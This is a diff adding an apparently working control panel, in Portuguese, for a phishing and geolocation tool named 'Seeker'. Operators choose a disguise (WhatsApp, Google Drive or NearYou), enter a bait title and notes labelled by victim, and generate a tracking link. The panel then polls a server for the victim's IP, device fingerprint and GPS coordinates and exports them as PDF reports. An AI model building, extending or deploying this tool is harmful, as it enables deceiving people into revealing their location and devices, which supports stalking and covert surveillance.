@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controle - Seeker</title>
+    <style>      
+     
+        body { 
+            font-family: system-ui, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; 
+            /* MODIFICAÃ‡ÃƒO CHAVE: Remove flex-direction: column e centraliza horizontalmente */
+            justify-content: center; 
+            align-items: flex-start; /* Alinha no topo para que o conteÃºdo comece junto */
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 20px; 
+            gap: 20px; /* EspaÃ§o entre as colunas */
+        }
+        
+        /* ContÃªiner principal do Gerador de Link */
+        .container { 
+            background: white; 
+            padding: 2rem 2.5rem; 
+            border-radius: 12px; 
+            box-shadow: 0 6px 20px rgba(0,0,0,0.08); 
+            width: 100%; 
+            max-width: 450px; 
+            flex-shrink: 0; /* Impede que encolha */
+        }
+        
+        h1 { text-align: center; color: #1c1e21; margin-top: 0; }
+        .form-group { margin-bottom: 1.25rem; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; }
+        input, select, button { width: 100%; padding: 0.8rem; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 1rem; }
+        button { background-color: #007bff; color: white; border: none; cursor: pointer; font-weight: 600; transition: background-color 0.2s; }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #a0a0a0; cursor: not-allowed; }
+        #result-container { margin-top: 1.5rem; display: none; }
+        .input-group { display: flex; }
+        .input-group input { border-right: none; border-top-right-radius: 0; border-bottom-right-radius: 0; background-color: #fff; }
+        .input-group button { width: auto; border-top-left-radius: 0; border-bottom-left-radius: 0; }
+        .status { margin-top: 1rem; text-align: center; color: #65676b; }
+        
+        /* NOVO LAYOUT PARA RASTREAMENTO */
+        #tracking-display {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 800px; 
+            min-height: 400px; /* Ajuda a dar uma forma inicial */
+            margin-top: 0; /* Remove margem superior desnecessÃ¡ria */
+            display: none;
+            text-align: left;
+            /* CHAVE: Permite que o display de rastreamento use o espaÃ§o restante */
+            flex-grow: 1; 
+        }
+
+        #tracking-display h2 {
+            text-align: center;
+            color: #1c1e21;
+            margin-bottom: 1.5rem;
+        }
+        .data-section {
+            border: 1px solid #eee;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            background-color: #f9f9f9;
+        }
+        .data-item strong {
+            display: inline-block;
+            min-width: 120px;
+            color: #0056b3;
+        }
+        .data-item {
+            margin-bottom: 5px;
+            border-bottom: 1px dotted #ddd;
+            padding-bottom: 3px;
+        }
+        .data-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        .status-header {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        /* Adiciona responsividade bÃ¡sica para telas pequenas */
+        @media (max-width: 1200px) {
+            body {
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+            .container, #tracking-display {
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Gerador de Link</h1>
+        <div class="form-group">
+            <label for="template">Template:</label>
+            <select id="template">
+                <option value="2">WhatsApp</option>
+                <option value="1">Google Drive</option>
+                <option value="0">NearYou</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="groupTitle">TÃ­tulo da Isca:</label>
+            <input type="text" id="groupTitle" placeholder="Ex: Vaga de Emprego Urgente">
+        </div>
+        <div class="form-group">
+            <label for="linkDescription">DescriÃ§Ã£o (AnotaÃ§Ãµes):</label>
+            <textarea id="linkDescription" rows="3" placeholder="Ex: VÃ­tima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
+        </div>
+        <div class="form-group">
+            <label for="groupImage">Imagem do Grupo (opcional):</label>
+            <input type="file" id="groupImage" accept="image/png, image/jpeg">
+        </div>
+        <button id="generateBtn">Gerar Link</button>
+        
+        <div class="status" id="status-text"></div>
+
+        <div id="result-container">
+            <label for="result-url">Link Gerado:</label>
+            <div class="input-group">
+                <input type="text" id="result-url" readonly>
+                <button id="copy-btn">Copiar</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="tracking-display">
+
+        <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
+        <button id="export-pdf-btn" style="margin-top: 20px; background-color: #dc3545;" disabled>Exportar como PDF</button>
+
+        <div id="description-section" class="data-section" style="display: none;">
+            <div class="status-header" style="color: #6c757d;">DescriÃ§Ã£o da Isca</div>
+            <div id="description-data"></div>
+        </div>
+               
+        <div id="tracking-status-message" class="status-header">Aguardando geraÃ§Ã£o do link...</div>
+
+        <div id="server-info-section" class="data-section" style="display: none;">
+            <div class="status-header" style="color: #6c757d;">InformaÃ§Ãµes de Rede (Server)</div>
+            <div id="server-info-data"></div>
+        </div>
+
+        <div id="device-info-section" class="data-section" style="display: none;">
+            <div class="status-header" style="color: #007bff;">InformaÃ§Ãµes do Dispositivo (Info)</div>
+            <div id="device-info-data"></div>
+        </div>
+
+        <div id="location-section" class="data-section" style="display: none;">
+            <div class="status-header" style="color: #28a745;">LocalizaÃ§Ã£o (Result)</div>
+            <div id="location-data"></div>
+        </div>
+        
+        <div id="error-section" class="data-section" style="display: none;">
+            <div class="status-header" style="color: #dc3545;">Erro de Rastreamento (Error)</div>
+            <div id="error-data"></div>
+        </div>
+       
+    </div>
+  
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
+<script>
+    const generateBtn = document.getElementById('generateBtn');
+    const resultContainer = document.getElementById('result-container');
+    const resultUrlInput = document.getElementById('result-url');
+    const copyBtn = document.getElementById('copy-btn');
+    const statusText = document.getElementById('status-text');
+    const trackingDisplay = document.getElementById('tracking-display');
+    const currentTrackingId = document.getElementById('current-tracking-id');
+    const trackingStatusMessage = document.getElementById('tracking-status-message');
+    
+    // Elementos de exibiÃ§Ã£o de dados
+    const deviceSection = document.getElementById('device-info-section');
+    const deviceData = document.getElementById('device-info-data');
+    const locationSection = document.getElementById('location-section');
+    const locationData = document.getElementById('location-data');
+    const errorSection = document.getElementById('error-section');
+    const errorData = document.getElementById('error-data');
+    const serverSection = document.getElementById('server-info-section');
+    const serverData = document.getElementById('server-info-data');
+
+    const templateSelect = document.getElementById('template');
+    const groupTitleInput = document.getElementById('groupTitle');
+    const groupImageInput = document.getElementById('groupImage');
+
+    const linkDescriptionInput = document.getElementById('linkDescription');
+    const descriptionSection = document.getElementById('description-section');
+    const descriptionData = document.getElementById('description-data');
+    const exportPdfBtn = document.getElementById('export-pdf-btn');
+
+    let activeTrackingId = null;
+    let fetchInterval = null;
+    
+    // Mapeamento de Chaves para exibiÃ§Ã£o limpa
+    const KEY_MAP = {
+        // Server Info
+        'clientIp': 'IP',
+        // Device Info (Mantidas do index_temp)
+        'Ptf': 'Plataforma (Ptf)',
+        'Brw': 'Navegador (Brw)',
+        'Ven': 'Fabricante GPU',
+        'Cc': 'NÃºcleos CPU (Cc)',
+        'Ram': 'RAM (GB)',
+        'Ren': 'GPU Renderer',
+        'Ht': 'Altura Tela',
+        'Wd': 'Largura Tela',
+        'Os': 'OS Completo',
+        // Location Result
+        'Status': 'Status',
+        'Lat': 'Latitude',
+        'Lon': 'Longitude',
+        'Acc': 'PrecisÃ£o (m)',
+        'Alt': 'Altitude',
+        'Dir': 'DireÃ§Ã£o',
+        'Spd': 'Velocidade',
+        'trackingId': 'Tracking ID'
+    };
+
+
+    copyBtn.addEventListener('click', () => {
+        resultUrlInput.select();
+        document.execCommand('copy');
+        copyBtn.textContent = 'Copiado!';
+        setTimeout(() => { copyBtn.textContent = 'Copiar'; }, 2000);
+    });
+    
+    // FunÃ§Ã£o para renderizar um objeto de dados em HTML formatado (melhor mapeamento)
+    function renderData(data, targetElement) {
+        let html = '';
+        
+        // Define a ordem para LocalizaÃ§Ã£o
+        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
+
+        // Ordena chaves para Location, senÃ£o usa a ordem natural
+        const keys = (targetElement.id === 'location-data') 
+            ? Object.keys(data).sort((a, b) => locationOrder.indexOf(a) - locationOrder.indexOf(b))
+            : Object.keys(data);
+
+
+        for (const key of keys) {
+            if (key === 'trackingId') continue; // Evita repetiÃ§Ã£o
+
+            // Mapeia para o nome legÃ­vel, senÃ£o usa o padrÃ£o
+            const formattedKey = KEY_MAP[key] || key.replace(/([A-Z])/g, ' $1').trim();
+            const displayValue = data[key];
+            
+            let valueHtml = displayValue;
+
+            // EstilizaÃ§Ã£o especial para IPs longos
+            if (key === 'clientIp' && displayValue.length > 20) {
+                 valueHtml = `<span style="word-break: break-all;">${displayValue}</span>`;
+            }
+            
+            html += `<div class="data-item"><strong>${formattedKey}:</strong> ${valueHtml}</div>`;
+        }
+        targetElement.innerHTML = html;
+    }
+
+    // FunÃ§Ã£o principal de busca de status de rastreamento
+    async function fetchTrackingStatus() {
+        if (!activeTrackingId) return;
+
+        try {
+            const fetchUrl = `${API_BASE_URL}/api/status?id=${activeTrackingId}`;
+
+            // NOVO LOG 1: O que estamos prestes a tentar buscar
+            console.log(`[DEBUG FETCH] Tentando buscar status em: ${fetchUrl}`);
+
+            const response = await fetch(fetchUrl);
+
+            if (!response.ok) {
+                // NOVO LOG 2: Se o servidor responder, mas com erro HTTP (404, 500, etc.)
+                console.error(`[DEBUG HTTP ERRO] Status: ${response.status}. URL: ${fetchUrl}`);
+                throw new Error(`HTTP Error: ${response.status}`);
+            }
+            
+            const data = await response.json();
+            
+            // Reseta a exibiÃ§Ã£o para o ciclo atual
+            serverSection.style.display = 'none';
+            deviceSection.style.display = 'none';
+            locationSection.style.display = 'none';
+            errorSection.style.display = 'none';
+            descriptionSection.style.display = 'none';
+
+            let status = 'Aguardando o recebimento de informaÃ§Ãµes...';
+
+            if (data.status === 'RECEIVED') {
+                status = 'âœ… InformaÃ§Ãµes recebidas!';
+
+                // Exibe DescriÃ§Ã£o
+                if (data.description) {
+                    descriptionSection.style.display = 'block';
+                    // Renderiza o tÃ­tulo da isca e a descriÃ§Ã£o juntos
+                    descriptionData.innerHTML = `
+                        <div class="data-item"><strong>TÃ­tulo:</strong> ${data.title}</div>
+                        <div class="data-item" style="border-bottom: none;"><strong>AnotaÃ§Ãµes:</strong> ${data.description.replace(/\n/g, '<br>')}</div>
+                    `;
+                }
+
+                // Exibe InformaÃ§Ãµes do Servidor (IP)
+                if (data.clientIp) {
+                    serverSection.style.display = 'block';
+                    const serverInfo = {};
+                    serverInfo.clientIp = data.clientIp;
+                    renderData(serverInfo, serverData);
+                }
+                
+                // Exibe InformaÃ§Ãµes do Dispositivo (Device Info)
+                if (data.info) {
+                    deviceSection.style.display = 'block';
+                    renderData(data.info, deviceData);
+                }
+
+                // Exibe LocalizaÃ§Ã£o (Location Result)
+                if (data.result) {
+                    locationSection.style.display = 'block';
+                    renderData(data.result, locationData);
+                    status = 'âœ… LocalizaÃ§Ã£o Recebida com Sucesso!';
+                }
+                
+                // Exibe Erros de LocalizaÃ§Ã£o
+                if (data.error) {
+                    errorSection.style.display = 'block';
+                    renderData(data.error, errorData);
+                    status = 'âš ï¸ Erro ao obter localizaÃ§Ã£o.';
+                }
+                
+            } else if (data.status === 'ACTIVE') {
+                 status = 'Aguardando o recebimento de informaÃ§Ãµes...';
+            }
+            
+            trackingStatusMessage.textContent = status;
+
+        } catch (error) {
+            // NOVO LOG 3: Captura a exceção exata (TypeError: Failed to fetch / SyntaxError)
+            console.error(`[DEBUG CATCH] Erro ao buscar status: ${error.name} - ${error.message}`);
+            trackingStatusMessage.textContent = 'Erro de conexão com o servidor de rastreamento: ' + error.name;
+        }
+    }
+
+
+    const API_BASE_URL = "";
+
+    
+    generateBtn.addEventListener('click', async () => {
+        const title = groupTitleInput.value;
+        const description = linkDescriptionInput.value;
+        const template = templateSelect.value;
+        const imageFile = groupImageInput.files[0];
+        
+        // Limpa intervalo anterior se existir
+        if (fetchInterval) clearInterval(fetchInterval);
+
+        // GERA O ID ÃšNICO E ATRIBUI Ã€ VARIÃVEL ATIVA
+        const tracking_id = generateRandomCode(16); 
+        activeTrackingId = tracking_id;
+        
+        // Limpa a tela de rastreamento
+        currentTrackingId.textContent = activeTrackingId;
+        trackingStatusMessage.textContent = 'Aguardando geraÃ§Ã£o do link...';
+        trackingDisplay.style.display = 'block';
+        deviceSection.style.display = 'none';
+        locationSection.style.display = 'none';
+        errorSection.style.display = 'none';
+        descriptionSection.style.display = 'none';
+        deviceData.innerHTML = '';
+        locationData.innerHTML = '';
+        errorData.innerHTML = '';
+
+
+        // EXTRAI A EXTENSÃƒO
+        let fileExtension = '';
+        if (imageFile) {
+            const fileName = imageFile.name;
+            fileExtension = fileName.substring(fileName.lastIndexOf('.'));
+        }
+
+        if (!title) {
+            alert('Por favor, insira um tÃ­tulo.');
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('template', template);
+        formData.append('groupTitle', title);
+        formData.append('linkDescription', description);
+        formData.append('trackingId', tracking_id); 
+        formData.append('imageExt', fileExtension); 
+        if (imageFile) formData.append('groupImage', imageFile);
+
+        generateBtn.disabled = true;
+        generateBtn.textContent = 'Gerando...';
+        resultContainer.style.display = 'none';
+        statusText.textContent = 'Iniciando serviÃ§os, aguarde...';
+
+        try {
+            // CORREÇÃO AQUI: Força a requisição POST para a porta 8888
+            const response = await fetch(`${API_BASE_URL}/generate-link`, { 
+                method: 'POST',
+                body: formData,
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                // A URL final Ã© montada no front-end para incluir o ID
+                const base_url = data.url; 
+                const final_url = `${base_url}?id=${tracking_id}`; 
+
+                statusText.textContent = 'Link gerado com sucesso!';
+                resultContainer.style.display = 'block';
+                resultUrlInput.value = final_url;
+                
+                // Inicia a busca de status a cada 3 segundos
+                fetchInterval = setInterval(fetchTrackingStatus, 3000);
+                exportPdfBtn.disabled = false;
+                
+            } else {
+                statusText.textContent = `Erro: ${data.message}`;
+            }
+        } catch (error) {
+            statusText.textContent = 'Erro de conexÃ£o com o servidor.';
+            console.error('Erro:', error);
+        } finally {
+            generateBtn.disabled = false;
+            generateBtn.textContent = 'Gerar Link';
+        }
+    });
+
+    // FunÃ§Ã£o separada para gerar cÃ³digo aleatÃ³rio
+    function generateRandomCode(length = 16) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+
+    // LÃ“GICA DE EXPORTAÃ‡ÃƒO DE PDF (fora da funÃ§Ã£o generateRandomCode)
+    function objectToTableData(data) {
+    const tableData = [];
+    const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
+    
+    // Mapeamento de Chaves para exibiÃ§Ã£o limpa (mesmo do renderData)
+    const KEY_MAP_PDF = {
+        'clientIp': 'IP',
+        'Ptf': 'Plataforma (Ptf)',
+        'Brw': 'Navegador (Brw)',
+        'Ven': 'Fabricante GPU',
+        'Cc': 'NÃºcleos CPU (Cc)',
+        'Ram': 'RAM (GB)',
+        'Ren': 'GPU Renderer',
+        'Ht': 'Altura Tela',
+        'Wd': 'Largura Tela',
+        'Os': 'OS Completo',
+        'Status': 'Status',
+        'Lat': 'Latitude',
+        'Lon': 'Longitude',
+        'Acc': 'PrecisÃ£o (m)',
+        'Alt': 'Altitude',
+        'Dir': 'DireÃ§Ã£o',
+        'Spd': 'Velocidade',
+        'trackingId': 'Tracking ID'
+    };
+
+    // Filtra e ordena as chaves
+    const keys = Object.keys(data).sort((a, b) => {
+        // Prioriza a ordem de LocalizaÃ§Ã£o, senÃ£o ordem alfabÃ©tica
+        const indexA = locationOrder.indexOf(a);
+        const indexB = locationOrder.indexOf(b);
+        if (indexA !== -1 && indexB !== -1) return indexA - indexB;
+        if (indexA !== -1) return -1;
+        if (indexB !== -1) return 1;
+        return a.localeCompare(b);
+    });
+    
+    for (const key of keys) {
+        if (key === 'trackingId') continue;
+        const formattedKey = KEY_MAP_PDF[key] || key.replace(/([A-Z])/g, ' $1').trim();
+        let displayValue = String(data[key]);
+
+        // FormataÃ§Ã£o para PDF (ex: IPs longos nÃ£o precisam de span, pois o jsPDF quebra linha automaticamente)
+        if (key === 'Os') {
+            displayValue = displayValue.includes('Windows NT 10.0') ? 'Windows 10/11' : displayValue;
+        }
+
+        tableData.push([formattedKey, displayValue]);
+    }
+
+    return tableData;
+}
+
+
+    exportPdfBtn.addEventListener('click', () => {
+        // 1. Faz a chamada sÃ­ncrona/imediata ao /api/status para obter os dados brutos
+        fetch(`/api/status?id=${activeTrackingId}`)
+            .then(res => res.json())
+            .then(data => {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF('p', 'mm', 'a4'); // 'p'ortrait, 'mm' units, 'a4' size
+                let yOffset = 15;
+                
+                // --- 1. TÃTULO GERAL E ID ---
+                doc.setFontSize(16);
+                doc.text(`RelatÃ³rio de Rastreamento`, 10, yOffset);
+                yOffset += 8;
+                doc.setFontSize(10);
+                doc.text(`Tracking ID: ${activeTrackingId}`, 10, yOffset);
+                yOffset += 10;
+
+                // --- 2. DESCRIÃ‡ÃƒO DA ISCA ---
+                if (data.title || data.description) {
+                    doc.setFontSize(12);
+                    doc.text('DescriÃ§Ã£o da Isca', 10, yOffset);
+                    yOffset += 6;
+                    doc.setFontSize(10);
+                    
+                    // Exibe o TÃ­tulo
+                    doc.text(`TÃ­tulo: ${data.title || 'N/A'}`, 10, yOffset);
+                    yOffset += 6;
+                    
+                    // Exibe a DescriÃ§Ã£o/AnotaÃ§Ãµes com quebra de linha
+                    const annotations = data.description || 'Nenhuma anotaÃ§Ã£o fornecida.';
+                    const textLines = doc.splitTextToSize(`AnotaÃ§Ãµes: ${annotations}`, 180); // 180mm de largura
+                    doc.text(textLines, 10, yOffset);
+                    yOffset += (textLines.length * 5) + 5; // Aumenta o offset baseado nas linhas
+                }
+
+                // --- 3. DADOS DE REDE E DISPOSITIVO (TABELA 1) ---
+                doc.setFontSize(12);
+                doc.text('Dados de Coleta (Rede e Dispositivo)', 10, yOffset);
+                yOffset += 2;
+                
+                const serverInfo = {};
+                if (data.clientIp) serverInfo.clientIp = data.clientIp;
+                
+                const deviceDataStore = {...serverInfo, ...data.info};
+                
+                const headStyles = { fillColor: [200, 200, 200], textColor: [0, 0, 0] };
+                
+                doc.autoTable({
+                    startY: yOffset + 4,
+                    head: [['Campo', 'Valor']],
+                    body: objectToTableData(deviceDataStore),
+                    theme: 'striped',
+                    styles: { fontSize: 9 },
+                    headStyles: headStyles,
+                    columnStyles: { 0: { fontStyle: 'bold', cellWidth: 40 } }
+                });
+                yOffset = doc.autoTable.previous.finalY;
+
+                // --- 4. DADOS DE LOCALIZAÃ‡ÃƒO (TABELA 2) ---
+                if (data.result || data.error) {
+                    yOffset += 10;
+                    doc.setFontSize(12);
+                    doc.text('Resultados de GeolocalizaÃ§Ã£o', 10, yOffset);
+                    yOffset += 2;
+
+                    const locationResultStore = data.result || data.error;
+                    
+                    doc.autoTable({
+                        startY: yOffset + 4,
+                        head: [['Campo', 'Valor']],
+                        body: objectToTableData(locationResultStore),
+                        theme: 'striped',
+                        styles: { fontSize: 9 },
+                        headStyles: headStyles,
+                        columnStyles: { 0: { fontStyle: 'bold', cellWidth: 40 } }
+                    });
+                }
+
+                // Salva o PDF
+                doc.save(`Rastreamento_${activeTrackingId}.pdf`);
+
+            }).catch(error => {
+                alert('Falha ao buscar dados para exportaÃ§Ã£o PDF: ' + error.message);
+                console.error('PDF Error:', error);
+            });
+    });
+
+
+</script>
+</body>
+</html>
